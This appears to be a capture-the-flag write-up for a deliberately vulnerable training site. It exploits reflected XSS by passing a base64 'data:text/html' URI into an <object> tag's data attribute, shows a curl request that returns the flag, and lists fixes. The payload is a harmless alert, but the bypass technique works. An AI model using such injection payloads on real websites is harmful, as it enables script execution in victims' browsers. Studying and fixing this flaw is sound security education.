# XSS Data parameter

## Exploitation

On the homepage, we can see a link on an image

```html
...
	<p>
        <br/>
        <br/>
        <br/>
        <a href="?page=media&src=nsa"><img src="images/nsa_prism.jpg" alt="" /></a>
    </p>
```

When we click on it, we go to a page `http://192.168.1.48/?page=media&src=nsa` with the same image

The take the image name on the GET parameter?

The image is not in a `<img>` but in `<object>`

```html
<object data="http://192.168.1.48/images/nsa_prism.jpg"></object>
```

What is an object balise?

> L'élément HTML <object\> représente une ressource externe qui peut être interprétée comme une image, un contexte de navigation imbriqué ou une ressource à traiter comme un plugin.
>
> <cite>https://developer.mozilla.org/fr/docs/Web/HTML/Element/object</cite>

Also, we can see in the header request we can inject html, not just images. Because the `<object>` don't have `type` attribute to force the type

> type
>
>    Le type MIME de la ressource définie par  data. Au moins un attribut data et un attribut type doivent être définis.
>
> <cite>https://developer.mozilla.org/fr/docs/Web/HTML/Element/object</cite>

```
Accept text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```

The `src` GET parameter is used to fill the `data` object attribute. We need to inject other data (html or script) to execute

The way to inject html on object `data` attribute is to encode the html in base64 and use this syntax:

```html
<object data="data:text/html;base64,encoded_payload"></object>
```

(https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris)

Let's encode a little javascript payload

```html
<script>alert("coucou");</script>
```

In base64:

```
$ echo "<script>alert("coucou");</script>" | openssl base64
PHNjcmlwdD5hbGVydChjb3Vjb3UpOzwvc2NyaXB0Pgo=
```

Ok, the parameter payload will be:

```
src="data:text/html;base64,PHNjcmlwdD5hbGVydChjb3Vjb3UpOzwvc2NyaXB0Pgo="
```

```
$ curl 'http://192.168.1.48/?page=media&src=%22data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=%22' | grep flag
<center><h2 style="margin-top:50px;"> The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center><table style="margin-top:-68px;"></table>				</div>
```

script it!

```
$ ./exploit.py          
 The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## How to fix it?

- Using the attribute `type` for `<object>` to force only images.
- Not use `<object>` but `<img>` instead, it's better for images on html
- Also get the full path of the image in the parameter, not just a short name
